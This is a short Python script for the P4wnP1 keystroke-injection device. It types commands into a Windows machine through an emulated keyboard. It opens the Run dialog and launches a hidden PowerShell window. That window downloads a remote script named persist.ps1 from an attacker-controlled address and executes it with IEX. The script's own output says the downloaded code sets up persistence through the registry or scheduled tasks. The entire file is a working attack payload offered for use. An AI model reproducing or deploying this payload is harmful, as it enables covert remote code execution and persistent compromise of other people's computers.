#!/usr/bin/env python3
import os, sys, time
P4WN_HOME=os.getenv("P4WN_HOME","/opt/p4wnp1"); sys.path.insert(0, os.path.join(P4WN_HOME,"tools"))
from hid_type import win_r, type_string

PS_URL = os.getenv("P4WN_PERSIST_PS_URL","http://10.13.37.1/payloads/www/private/persist.ps1")
PS_ARGS= os.getenv("P4WN_PERSIST_PS_ARGS","")

def main():
    win_r(); time.sleep(0.4); type_string("powershell\n"); time.sleep(0.8)
    cmd = f"IEX (New-Object Net.WebClient).DownloadString('{PS_URL}'); main {PS_ARGS}"
    type_string(f"powershell -nop -w hidden -c \"{cmd.replace('\"','\"\"')}\"\n")
    print("[*] Persistence wrapper invoked (your script handles registry/schtasks).")
    return 0

if __name__=='__main__': sys.exit(main())
